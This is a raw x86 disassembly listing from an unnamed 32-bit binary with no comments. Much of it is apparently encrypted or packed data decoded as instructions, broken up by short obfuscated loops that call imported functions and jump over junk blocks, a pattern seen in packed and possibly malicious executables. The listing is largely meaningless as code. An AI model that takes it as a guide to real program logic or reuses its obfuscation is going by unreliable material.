  4073ee:	outs   dx,DWORD PTR ds:[esi]
  4073ef:	outs   dx,DWORD PTR ds:[esi]
  4073f0:	cmp    eax,0x1c2259fd
  4073f5:	xchg   edx,eax
  4073f6:	das    
  4073f7:	std    
  4073f8:	shl    BYTE PTR [edi-0x33792904],cl
  4073fe:	ins    BYTE PTR es:[edi],dx
  4073ff:	fnstsw WORD PTR [eax-0x16]
  407402:	stc    
  407403:	(bad)  
  407404:	stos   BYTE PTR es:[edi],al
  407405:	test   BYTE PTR [ebx-0x41],ch
  407408:	jmp    0x407441
  40740a:	dec    esi
  40740b:	das    
  40740c:	imul   esi,edi,0x5a49e4e1
  407412:	and    eax,0x1b888edb
  407417:	xchg   BYTE PTR [edx-0x32],bl
  40741a:	or     ecx,ebx
  40741c:	and    BYTE PTR [edi],dl
  40741e:	pop    ecx
  40741f:	and    dl,BYTE PTR [eiz*8-0x6e1cca86]
  407426:	push   0xc50c8163
  40742b:	and    eax,DWORD PTR [ebx+0x1e]
  40742e:	leave  
  40742f:	xor    eax,0x1ae04e8a
  407434:	pop    ds
  407435:	push   es
  407436:	push   esp
  407437:	inc    eax
  407438:	std    
  407439:	outs   dx,DWORD PTR ds:[esi]
  40743a:	add    DWORD PTR [ebx+0x4b1b80fe],0xb
  407441:	pusha  
  407442:	in     eax,0x62
  407444:	sub    DWORD PTR [ebx],esi
  407446:	ror    BYTE PTR [ebx+0xd81f07d],1
  40744c:	push   edi
  40744d:	add    eax,DWORD PTR [ebx+0x0]
  407450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407451:	jno    0x407453
  407453:	add    BYTE PTR [ebx],al
  407455:	rol    edi,1
  407457:	add    eax,0x4302c9
  40745c:	dec    ecx
  40745d:	pop    edx
  40745e:	add    BYTE PTR [eax],al
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [esi+0x359ce77d],ah
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x407423
  40748a:	pop    edi
  40748b:	cs jl  0x40744a
  40748e:	pusha  
  40748f:	icebp  
  407490:	jecxz  0x407436
  407492:	jg     0x4074dc
  407494:	fmul   QWORD PTR [esp+eax*4]
  407497:	fwait
  407498:	mov    eax,0x1dba1c7a
  40749d:	loope  0x4074a7
  40749f:	lock cld 
  4074a1:	mov    ebx,0xd927ff03
  4074a6:	cld    
  4074a7:	dec    ebx
  4074a8:	pop    ecx
  4074a9:	inc    ebx
  4074aa:	imul   edi,DWORD PTR [edi+0x55],0x3769805
  4074b1:	adc    eax,0x648366a4
  4074b6:	ror    al,1
  4074b8:	xor    eax,0x620b9a74
  4074bd:	mov    cl,0x93
  4074bf:	mov    bl,0xe5
  4074c1:	xor    ch,BYTE PTR [eax]
  4074c3:	mov    edi,0x8b44b80a
  4074c8:	mov    bh,0x29
  4074ca:	or     BYTE PTR [ecx-0x37],al
  4074cd:	imul   DWORD PTR [ebp+0x7e]
  4074d0:	adc    eax,0x6c50e6c1
  4074d5:	outs   dx,DWORD PTR ds:[esi]
  4074d6:	nop
  4074d7:	sub    dh,bl
  4074d9:	iret   
  4074da:	add    esi,ebp
  4074dc:	push   0xae46a780
  4074e1:	xchg   ebp,eax
  4074e2:	bound  edx,QWORD PTR [esi]
  4074e4:	pop    eax
  4074e5:	sub    al,BYTE PTR [ecx+0x60ae867d]
  4074eb:	sahf   
  4074ec:	sub    esi,ebx
  4074ee:	xor    BYTE PTR [edi],bh
  4074f0:	inc    eax
  4074f1:	rol    esi,cl
  4074f3:	bnd jmp 0x40748b
  4074f6:	jp     0x407519
  4074f8:	xchg   ebp,eax
  4074f9:	dec    ebp
  4074fa:	jge    0x4074c1
  4074fc:	inc    esp
  4074fd:	rcl    DWORD PTR ds:0x41b9ef23,0xaf
  407504:	test   al,0xce
  407506:	add    dh,BYTE PTR [edx+0x12]
  407509:	jnp    0x407531
  40750b:	inc    edi
  40750c:	sub    DWORD PTR [ecx-0x69f20995],0x70
  407513:	xchg   ecx,eax
  407514:	xchg   BYTE PTR [ecx],ah
  407516:	push   0x3b
  407518:	mov    eax,ds:0xd91b582f
  40751d:	data16 loopne 0x407566
  407520:	imul   edi,DWORD PTR [esi-0x303fd2e2],0xffffffeb
  407527:	test   al,0x5b
  407529:	mov    edx,0x9918d198
  40752e:	sahf   
  40752f:	jge    0x4074f4
  407531:	aas    
  407532:	adc    al,0x8
  407534:	xchg   ebp,eax
  407535:	mov    bh,BYTE PTR [ebp+0x7]
  407538:	cmp    al,0xcd
  40753a:	ja     0x40754b
  40753c:	inc    ecx
  40753d:	icebp  
  40753e:	cmc    
  40753f:	test   al,0x4
  407541:	(bad)  
  407542:	pop    esp
  407543:	jl     0x40759e
  407545:	mov    cl,0x52
  407547:	fucom  st(5)
  407549:	jl     0x407572
  40754b:	pushf  
  40754c:	imul   di,WORD PTR [edi-0x51],0xffc2
  407551:	cmp    BYTE PTR [edi-0x4110de10],0x4
  407558:	cmc    
  407559:	fidivr WORD PTR [esi]
  40755b:	repnz push 0x6a05fef9
  407561:	icebp  
  407562:	push   0x5a
  407564:	andnps xmm0,xmm4
  407567:	adc    al,0x91
  407569:	pop    esp
  40756a:	shr    ch,0x52
  40756d:	add    ebx,DWORD PTR [ebx-0x33]
  407570:	mov    esi,0x1870b63c
  407575:	fdiv   st(7),st
  407577:	dec    edx
  407578:	lods   al,BYTE PTR ds:[esi]
  407579:	outs   dx,DWORD PTR ds:[esi]
  40757a:	ror    DWORD PTR [eax+0x294ec10e],1
  407580:	int3   
  407581:	imul   eax,edi,0x18
  407584:	outs   dx,BYTE PTR ds:[esi]
  407585:	sbb    eax,0x483a56cd
  40758a:	pop    eax
  40758b:	or     cl,BYTE PTR [esi+0x63]
  40758e:	sbb    esp,DWORD PTR [esi+edi*8+0x67]
  407592:	stos   DWORD PTR es:[edi],eax
  407593:	adc    BYTE PTR [esi+0x1abd2d11],cl
  407599:	fsub   DWORD PTR [esi]
  40759b:	(bad)  
  40759c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40759d:	icebp  
  40759e:	xor    DWORD PTR [edi+edx*1+0x66719791],0x2b811e98
  4075a9:	loop   0x4075e0
  4075ab:	mov    bl,0x6
  4075ad:	ret    0x53e8
  4075b0:	fist   DWORD PTR [ebx-0x35e870e4]
  4075b6:	in     al,dx
  4075b7:	fcom   QWORD PTR [ecx+0x3286c344]
  4075bd:	mov    ebp,0x187d4a67
  4075c2:	aad    0xa2
  4075c4:	xor    bh,al
  4075c6:	dec    ebx
  4075c7:	inc    eax
  4075c8:	test   al,0x80
  4075ca:	mov    ch,0xab
  4075cc:	(bad)  
  4075cd:	dec    edi
  4075ce:	mov    edx,0x1cd69ad8
  4075d3:	mov    WORD PTR [ebx+0x1a],?
  4075d6:	aaa    
  4075d7:	popf   
  4075d8:	rcl    BYTE PTR [edi+0x197c5983],cl
  4075de:	(bad)
  4075e3:	sbb    BYTE PTR [ebx+esi*2],bl
  4075e6:	push   esi
  4075e7:	pop    ds
  4075e8:	mov    ebp,0xfa70b7ef
  4075ed:	fwait
  4075ee:	or     eax,0x76e9a2c3
  4075f3:	rcr    DWORD PTR ds:0xbb1c957f,0x5a
  4075fa:	loopne 0x407656
  4075fc:	push   ebx
  4075fd:	outs   dx,DWORD PTR ds:[esi]
  4075fe:	pushf  
  4075ff:	mov    edx,0x9068ca20
  407604:	xchg   bl,ch
  407606:	loope  0x4075b4
  407608:	inc    edi
  407609:	pop    edi
  40760a:	mov    BYTE PTR [eax+edi*1-0x6cb13f06],0x4c
  407612:	test   BYTE PTR cs:[ebx-0x76],al
  407616:	lods   al,BYTE PTR ds:[esi]
  407617:	(bad)
  40761b:	or     BYTE PTR [edi+ecx*1-0x7c],dh
  40761f:	jmp    0x40763b
  407621:	add    BYTE PTR [eax],al
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	sbb    DWORD PTR [esi-0x3dbe191c],0x7f8a7e7e
  4076ae:	jle    0x40772e
  4076b0:	loopne 0x40772a
  4076b2:	and    edx,DWORD PTR [esi+0x7b]
  4076b5:	push   DWORD PTR [ebx+0x1b]
  4076b8:	push   ebp
  4076b9:	mov    al,ds:0x71b1e387
  4076be:	aad    0xb1
  4076c0:	cwde   
  4076c1:	jb     0x532d86c7
  4076c7:	int    0x96
  4076c9:	adc    edx,DWORD PTR [eax+0x2d]
  4076cc:	push   ebp
  4076cd:	sub    al,0xfd
  4076cf:	sub    cl,ch
  4076d1:	or     al,0x7a
  4076d3:	ret    0x6abf
  4076d6:	loop   0x407675
  4076d8:	jge    0x4076ca
  4076da:	sbb    esp,edx
  4076dc:	int    0x3f
  4076de:	test   eax,0x3ff9e11b
  4076e3:	fst    QWORD PTR [esi+0xf]
  4076e6:	pop    esp
  4076e7:	in     eax,dx
  4076e8:	setbe  al
  4076eb:	push   0xffffffe0
  4076ed:	sbb    eax,0xcaf15e4a
  4076f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f3:	in     al,0xc
  4076f5:	mov    ds:0x3acaf57b,ax
  4076fb:	loope  0x40771c
  4076fd:	js     0x407699
  4076ff:	xor    DWORD PTR [eax-0x490a24a],0xaf1d33cc
  407709:	fwait
  40770a:	lods   al,BYTE PTR ds:[esi]
  40770b:	xor    BYTE PTR [ecx],bl
  40770d:	xor    DWORD PTR [edi+0x40313b6c],ebp
  407713:	outs   dx,DWORD PTR ds:[esi]
  407714:	idiv   DWORD PTR [esi-0x4531c50e]
  40771a:	mov    ?,WORD PTR [edx]
  40771c:	pop    ebx
  40771d:	push   0x7120116d
  407722:	sbb    al,0x20
  407724:	and    BYTE PTR [ecx],ch
  407726:	in     al,0x81
  407728:	mov    dl,0xcc
  40772a:	inc    ecx
  40772b:	pushf  
  40772c:	fwait
  40772d:	xor    cl,bh
  40772f:	cdq    
  407730:	mov    BYTE PTR [ebx+0x19],bh
  407733:	mulps  xmm1,xmm4
  407736:	xor    al,0xdb
  407738:	not    bl
  40773a:	sbb    bl,BYTE PTR [edi]
  40773c:	(bad)  
  40773d:	ror    al,1
  40773f:	push   esp
  407740:	popa   
  407741:	arpl   WORD PTR [ebp+0x70965e22],sp
  407747:	test   DWORD PTR [ecx],edx
  407749:	aad    0xf5
  40774b:	mov    ebp,0x8f2affed
  407750:	test   BYTE PTR [edx],bh
  407752:	dec    ebx
  407753:	mov    ebx,ebp
  407755:	popa   
  407756:	dec    esp
  407757:	xchg   edx,eax
  407758:	add    ah,BYTE PTR [esi+0x76]
  40775b:	popa   
  40775c:	into   
  40775d:	mov    bl,0xdc
  40775f:	pop    ecx
  407760:	inc    eax
  407761:	clc    
  407762:	xor    al,BYTE PTR [esi]
  407764:	pop    es
  407765:	mov    ah,ah
  407767:	cld    
  407768:	sub    BYTE PTR [ebp+0x4e],ah
  40776b:	ds data16 je 0x4077b7
  40776f:	pushf  
  407770:	into   
  407771:	sbb    ch,bl
  407773:	mov    DWORD PTR [edi],eax
  407775:	dec    ebx
  407776:	out    0x83,al
  407778:	retf   
  407779:	stc    
  40777a:	xchg   edx,eax
  40777b:	add    dh,BYTE PTR [ecx+0x39]
  40777e:	mov    edx,0x820068b7
  407783:	mov    ah,0x9
  407785:	sbb    bh,ch
  407787:	int3   
  407788:	imul   BYTE PTR [ebx+esi*1+0x19]
  40778c:	pop    eax
  40778d:	cdq    
  40778e:	adc    DWORD PTR [edx+0x38],esp
  407791:	test   DWORD PTR [eax+0x7a],edi
  407794:	and    eax,0xdeab7d15
  407799:	fild   DWORD PTR [ebx+0x8]
  40779c:	pop    ds
  40779d:	xchg   ebp,eax
  40779e:	mov    edx,0x6bb26d61
  4077a3:	gs jo  0x4077b4
  4077a6:	stos   DWORD PTR es:[edi],eax
  4077a7:	outs   dx,DWORD PTR ds:[esi]
  4077a8:	(bad)  
  4077a9:	(bad)  
  4077ab:	repz cld 
  4077ad:	gs pop ecx
  4077af:	add    eax,0x7f42f6bb
  4077b4:	imul   esp,DWORD PTR [ebx],0x74
  4077b7:	stc    
  4077b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b9:	sbb    edi,edx
  4077bb:	in     al,0x49
  4077bd:	mov    dh,al
  4077bf:	push   cs
  4077c0:	rcr    BYTE PTR [ebp-0x6e],cl
  4077c3:	adc    DWORD PTR [esi+esi*1+0x5f],0x4c
  4077c8:	sbb    DWORD PTR [eax-0x2e6d4fde],edx
  4077ce:	inc    edi
  4077cf:	pop    esi
  4077d0:	cmp    eax,0x4758a41b
  4077d5:	jmp    0x76de:0xb2699130
  4077dc:	and    edi,esp
  4077de:	cld    
  4077df:	inc    esi
  4077e0:	or     BYTE PTR [edx],ah
  4077e2:	fs hlt 
  4077e4:	adc    eax,0x24813313
  4077e9:	in     eax,0x9a
  4077eb:	cld    
  4077ec:	aad    0xf0
  4077ee:	dec    edx
  4077ef:	sahf   
  4077f0:	pushf  
  4077f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077f2:	xchg   edi,eax
  4077f3:	push   edi
  4077f4:	sbb    BYTE PTR [ecx+0x49],ah
  4077f7:	sub    DWORD PTR [edx],edx
  4077f9:	sbb    al,0x47
  4077fb:	jmp    0x4077c5
  4077fd:	fs or  al,0xba
  407800:	jmp    0xb09b:0xc6377c1f
  407807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407808:	shr    DWORD PTR [eax-0x386a65b6],1
  40780e:	sbb    al,0x16
  407810:	das    
  407811:	dec    ebx
  407812:	push   esi
  407813:	retf   
  407814:	call   0x6443:0xc95a5258
  40781b:	faddp  st(3),st
  40781d:	jne    0x407874
  40781f:	(bad)  
  407820:	scas   al,BYTE PTR es:[edi]
  407821:	hlt    
  407822:	cmp    esp,DWORD PTR [edi]
  407824:	push   edi
  407825:	mov    ds,WORD PTR [esi]
  407827:	pushf  
  407828:	in     eax,dx
  407829:	daa    
  40782a:	rcr    ebx,cl
  40782c:	pop    eax
  40782d:	or     DWORD PTR [eax],0xbc89fb2
  407833:	and    ebx,DWORD PTR [edx]
  407835:	dec    esi
  407836:	dec    eax
  407837:	fldcw  WORD PTR [edi+0x22]
  40783a:	gs push cs
  40783c:	mov    bh,0x40
  40783e:	addr16 jge 0x4077ce
  407841:	xor    DWORD PTR [eax-0x3aa7495],edi
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	jmp    DWORD PTR [esi]
  407943:	shl    eax,0xba
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x40791e
  40794f:	ja     0x40798e
  407951:	pop    edi
  407952:	jbe    0x407926
  407954:	fs mov ecx,0xba5455e5
  40795a:	aaa    
  40795b:	out    0xc4,al
  40795d:	cmp    BYTE PTR [ebp-0x3e],bh
  407960:	mov    bh,0xc3
  407962:	mov    DWORD PTR [esi+0x7f70dd34],ebx
  407968:	fdivr  QWORD PTR [eax-0x641fe2f5]
  40796e:	iret   
  40796f:	and    ah,BYTE PTR [ebx+eax*4+0x60]
  407973:	dec    ebx
  407974:	adc    edx,DWORD PTR [edx]
  407976:	hlt    
  407977:	sub    al,0x83
  407979:	cmc    
  40797a:	add    al,0xd7
  40797c:	das    
  40797d:	mov    ch,BYTE PTR [ebp+0x7e]
  407980:	adc    DWORD PTR [eax-0x33],eax
  407983:	dec    ebp
  407984:	sti    
  407985:	jmp    0x407907
  407987:	ret    
  407988:	mov    WORD PTR [esp+edi*1-0x43936b2c],ds
  40798f:	mov    ds:0xa7bfd310,al
  407994:	ja     0x407a0f
  407996:	or     DWORD PTR [esi+ebp*2+0x4ab1fbe4],eax
  40799d:	pop    edx
  40799e:	and    edi,eax
  4079a0:	sub    ebp,eax
  4079a2:	psllw  mm7,QWORD PTR [ebp+eax*2+0xc674a37]
  4079aa:	outs   dx,BYTE PTR ds:[esi]
  4079ab:	jp     0x407956
  4079ad:	mov    bh,0x88
  4079af:	rcr    bl,1
  4079b1:	pop    edx
  4079b2:	lods   eax,DWORD PTR ds:[esi]
  4079b3:	dec    esp
  4079b4:	mov    dl,BYTE PTR [eax]
  4079b6:	xchg   edi,eax
  4079b7:	inc    ebx
  4079b8:	mov    ds:0x1c3ffb53,eax
  4079bd:	outs   dx,DWORD PTR ds:[esi]
  4079be:	xchg   ebx,eax
  4079bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079c0:	in     eax,dx
  4079c1:	and    bl,ch
  4079c3:	lock cmp ecx,DWORD PTR [ecx]
  4079c6:	(bad)  
  4079c7:	stos   BYTE PTR es:[edi],al
  4079c8:	inc    ebx
  4079c9:	mov    ds:0x4645f062,eax
  4079ce:	hlt    
  4079cf:	cmp    eax,0x99ab2668
  4079d4:	cwde   
  4079d5:	jmp    0x3847:0x1d43fc47
  4079dc:	xchg   DWORD PTR [edx],ecx
  4079de:	sub    BYTE PTR [eax],ah
  4079e0:	mov    esp,0x53cb1059
  4079e5:	adc    edi,DWORD PTR [edi]
  4079e7:	in     eax,dx
  4079e8:	jmp    0x4079d2
  4079ea:	jg     0x407981
  4079ec:	push   esp
  4079ed:	hlt    
  4079ee:	jmp    0xf8ac62cc
  4079f3:	cmp    ebx,DWORD PTR [edx-0x6c6ec491]
  4079f9:	lock (bad) 
  4079fb:	xlat   BYTE PTR ds:[ebx]
  4079fc:	fisub  WORD PTR [eax]
  4079fe:	push   edx
  4079ff:	fdivr  st,st(5)
  407a01:	pusha  
  407a02:	sub    eax,0x2dca018e
  407a07:	jnp    0x4079ed
  407a09:	xor    DWORD PTR [edi],0x84c263eb
  407a0f:	dec    BYTE PTR [eax+0x2e]
  407a12:	lds    esp,FWORD PTR [ecx+0x6953f9a6]
  407a18:	out    0x74,eax
  407a1a:	and    ebx,0xbe66d44f
  407a20:	cdq    
  407a21:	jmp    0x407a29
  407a23:	das    
  407a24:	pushf  
  407a25:	mov    DWORD PTR [ecx-0x1e5c0ff1],ebp
  407a2b:	cmp    eax,0x86cdc9a2
  407a30:	xchg   ebp,eax
  407a31:	adc    al,0xd1
  407a33:	nop
  407a34:	adc    ebx,DWORD PTR ds:0x97c9eb2a
  407a3a:	inc    edx
  407a3b:	mov    edx,0xc310d037
  407a40:	ret    0x3495
  407a43:	add    al,0x87
  407a45:	cmp    ebx,edx
  407a47:	callw  0xabeb
  407a4b:	dec    BYTE PTR [ecx+eax*8-0x10]
  407a4f:	or     BYTE PTR [ebx],ah
  407a51:	(bad)  
  407a52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a53:	add    al,0xdb
  407a55:	stos   DWORD PTR es:[edi],eax
  407a56:	div    ebx
  407a58:	shl    DWORD PTR ds:[di-0x15],0xd3
  407a5e:	addr16 hlt 
  407a60:	dec    eax
  407a61:	pminub mm6,QWORD PTR [ecx-0x36]
  407a65:	sbb    eax,0xaf81c1d6
  407a6a:	arpl   bx,dx
  407a6c:	adc    eax,0x99548f9d
  407a71:	xor    BYTE PTR [eax+0x51],ah
  407a74:	std    
  407a75:	mov    esp,0x217a200
  407a7a:	adc    al,0xfe
  407a7c:	(bad)  
  407a7d:	int3   
  407a7e:	dec    edx
  407a7f:	push   eax
  407a80:	dec    esi
  407a81:	inc    ebx
  407a82:	dec    esp
  407a83:	inc    ebp
  407a84:	jb     0x407ac4
  407a86:	loop   0x407a12
  407a88:	cld    
  407a89:	jmp    0x4a49c5d0
  407a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8f:	out    dx,al
  407a90:	daa    
  407a91:	test   DWORD PTR [edx-0x60],edi
  407a94:	bound  edx,QWORD PTR [eax]
  407a96:	pop    esi
  407a97:	stos   BYTE PTR es:[edi],al
  407a98:	mov    ebx,0xb8276546
  407a9d:	(bad)  
  407a9e:	pop    esp
  407a9f:	adc    ch,BYTE PTR [eax+0x4f]
  407aa2:	(bad)  
  407aa3:	neg    DWORD PTR [ecx-0x70357364]
  407aa9:	repz push 0xffffff8b
  407aac:	xlat   BYTE PTR ds:[ebx]
  407aad:	cmp    al,0x3f
  407aaf:	xchg   esi,eax
  407ab0:	mov    cs:0xedb1d486,al
  407ab6:	sub    BYTE PTR [ebx*2+0x7e8ee2e0],dh
  407abd:	shl    DWORD PTR [ebx],0x3c
  407ac0:	leave  
  407ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac2:	js     0x407abc
  407ac4:	out    0xdb,al
  407ac6:	aad    0x7b
  407ac8:	or     DWORD PTR [ebx+0x25c3ea07],ebx
  407ace:	jae    0x407b14
  407ad0:	mov    esp,0x1cfb002d
  407ad5:	mov    BYTE PTR [ebx-0x6759aef],ch
  407adb:	outs   dx,DWORD PTR ds:[esi]
  407adc:	mov    ebp,0x58f57ad6
  407ae1:	mov    ebx,DWORD PTR gs:[ebp-0x10]
  407ae5:	sub    ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0x188e7eca]
  407b11:	mov    bh,0x69
  407b13:	sar    DWORD PTR [esi+0x7e],0x8a
  407b17:	jg     0x407b97
  407b19:	jle    0x407ab7
  407b1b:	mov    esi,0xca13480e
  407b20:	pop    edi
  407b21:	lods   eax,DWORD PTR ds:[esi]
  407b22:	jae    0x407acd
  407b24:	popa   
  407b25:	inc    edi
  407b26:	jnp    0x407acf
  407b28:	and    DWORD PTR [edi+0xf449819],ecx
  407b2e:	mov    BYTE PTR [ecx],bl
  407b30:	jo     0x407b86
  407b32:	mov    bl,BYTE PTR [esi+0x16]
  407b35:	inc    edx
  407b36:	mov    ch,0xdc
  407b38:	cmc    
  407b39:	leave  
  407b3a:	dec    edx
  407b3b:	ins    DWORD PTR es:[edi],dx
  407b3c:	mov    cl,0x22
  407b3e:	ret    0x6a27
  407b41:	dec    edi
  407b42:	dec    edx
  407b43:	adc    DWORD PTR [eax-0x696a2d22],ebp
  407b49:	adc    DWORD PTR [edi+ebp*4+0x34],esp
  407b4d:	pop    eax
  407b4e:	scas   al,BYTE PTR es:[edi]
  407b4f:	rcr    BYTE PTR [esi-0x7b1adbf0],1
  407b55:	mov    cl,0x9a
  407b57:	mov    ecx,ebx
  407b59:	lods   al,BYTE PTR ds:[esi]
  407b5a:	or     al,0x1e
  407b5c:	cmp    esp,edx
  407b5e:	sub    DWORD PTR [ecx+0x34ac3d45],0x16
  407b65:	jmp    0x407be1
  407b67:	mov    eax,0x184d003a
  407b6c:	push   edi
  407b6d:	cmp    esp,DWORD PTR [eax+0xff80d56]
  407b73:	mov    ah,0xd5
  407b75:	mov    al,ds:0xc30741f9
  407b7a:	jb     0x407bc4
  407b7c:	es pop ss
  407b7e:	jae    0x407b4e
  407b80:	inc    ebx
  407b81:	sbb    bh,BYTE PTR [edi+edx*4-0x17]
  407b85:	(bad)  
  407b86:	jl     0x407be4
  407b88:	inc    eax
  407b89:	sub    eax,0x11c7376d
  407b8e:	retf   
  407b8f:	sub    eax,0xafabb645
  407b94:	jbe    0x407b3b
  407b96:	pop    es
  407b97:	jno    0x407bc8
  407b99:	outs   dx,BYTE PTR ds:[esi]
  407b9a:	cld    
  407b9b:	cwde   
  407b9c:	sahf   
  407b9d:	in     al,dx
  407b9e:	mov    dh,0x6b
  407ba0:	pop    es
  407ba1:	mov    al,0x8f
  407ba3:	pop    ecx
  407ba4:	mov    ah,0xb4
  407ba6:	popa   
  407ba7:	ds jno 0x407b68
  407baa:	xchg   ebp,eax
  407bab:	inc    edi
  407bac:	icebp  
  407bad:	jo     0x407c07
  407baf:	mov    cl,0x3f
  407bb1:	cmp    DWORD PTR [ecx+0x21e2e72d],ebx
  407bb7:	lahf   
  407bb8:	pop    ebp
  407bb9:	mov    esp,0x1070ebcd
  407bbe:	xor    al,0x87
  407bc0:	jge    0x407c2e
  407bc2:	(bad)  
  407bc3:	repz jp 0x407b6e
  407bc6:	cmp    eax,0xfbfb1058
  407bcb:	int3   
  407bcc:	xchg   ebp,eax
  407bcd:	sbb    DWORD PTR [ecx],ebp
  407bcf:	cmc    
  407bd0:	sub    eax,DWORD PTR [edi]
  407bd2:	mov    eax,0xf9bc29b8
  407bd7:	out    dx,al
  407bd8:	mov    esi,0xa6126c77
  407bdd:	adc    dh,bl
  407bdf:	scas   eax,DWORD PTR es:[edi]
  407be0:	daa    
  407be1:	mov    es,WORD PTR [edi]
  407be3:	into   
  407be4:	mov    esp,esp
  407be6:	jmp    0x1b7f:0x2ebce3f2
  407bed:	jp     0x407b74
  407bef:	jg     0x407c27
  407bf1:	addr16 inc eax
  407bf3:	loop   0x407b81
  407bf5:	push   ss
  407bf6:	mov    ch,0x94
  407bf8:	lahf   
  407bf9:	xchg   edi,eax
  407bfa:	cmp    al,0x40
  407bfc:	icebp  
  407bfd:	repnz loopne 0x407bf3
  407c00:	or     eax,0x2db82ccc
  407c05:	jns    0x407b94
  407c07:	das    
  407c08:	ins    BYTE PTR es:[edi],dx
  407c09:	pop    ebp
  407c0a:	hlt    
  407c0b:	lods   al,BYTE PTR ds:[esi]
  407c0c:	mulps  xmm2,xmm4
  407c0f:	push   edi
  407c10:	push   ebp
  407c11:	(bad)  
  407c12:	adc    esp,DWORD PTR [edx+0xa31295f]
  407c18:	adc    al,0x45
  407c1a:	jp     0x407c85
  407c1c:	mov    eax,0x8253280
  407c21:	arpl   WORD PTR [ebx-0x7a],dx
  407c24:	or     dl,BYTE PTR [eax-0x75bb4474]
  407c2a:	sbb    BYTE PTR [ebx-0x4a],bl
